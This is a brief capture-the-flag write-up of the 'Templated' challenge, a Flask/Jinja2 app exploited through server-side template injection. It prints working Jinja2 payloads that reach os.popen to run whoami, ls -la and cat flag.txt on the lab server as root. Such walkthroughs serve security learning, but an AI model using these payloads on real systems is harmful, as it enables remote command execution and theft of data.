---
layout: default
title : muzec - Templated Writeup
---

![image](https://user-images.githubusercontent.com/69868171/119482850-55be3a80-bd22-11eb-89f7-fd6a1fed8e7b.png)

Just a simple Server Side Template Injection (SSTI) .

On the web page i think we have all the hint we can ask for we already know it Proudly powered by Flask/Jinja2 so let try to confirm it.

![image](https://user-images.githubusercontent.com/69868171/119483235-c06f7600-bd22-11eb-8b1d-3a38ba6f6a32.png)

`http://138.68.141.81:32732/$` we get 404 not found but our input reflect let try injecting another command.

![image](https://user-images.githubusercontent.com/69868171/119483492-0593a800-bd23-11eb-9941-ccd46c750a2d.png)

`http://138.68.141.81:32732/${` Boom again let find the crash point.

![image](https://user-images.githubusercontent.com/69868171/119483686-396ecd80-bd23-11eb-9c70-df465133ad7c.png)

Boom a crash point `http://138.68.141.81:32732/${{` now we can easily generate our payload one fresh payload coming up.

`138.68.141.81:32732/{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}`
![image](https://user-images.githubusercontent.com/69868171/119861084-fd836600-bee4-11eb-801e-2f9e6730f121.png)


![image](https://user-images.githubusercontent.com/69868171/119484124-b26e2500-bd23-11eb-8738-7c7721b1e252.png)

Boom we are the root user cool let list directory.

![image](https://user-images.githubusercontent.com/69868171/119484303-e0ec0000-bd23-11eb-89b4-f6f0ace0a733.png)

![image](https://user-images.githubusercontent.com/69868171/119484373-f3663980-bd23-11eb-9e5a-68096889a917.png)

`138.68.141.81:32732/{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}`
![image](https://user-images.githubusercontent.com/69868171/119861942-f14bd880-bee5-11eb-8105-77f8cc784728.png)


We can see the flag.txt let cat it and we are done.

`138.68.141.81:32732/{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}`
![image](https://user-images.githubusercontent.com/69868171/119862038-13455b00-bee6-11eb-98ed-827367a2aaef.png)


Nah not going to show you the flag get it yourself lol.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>


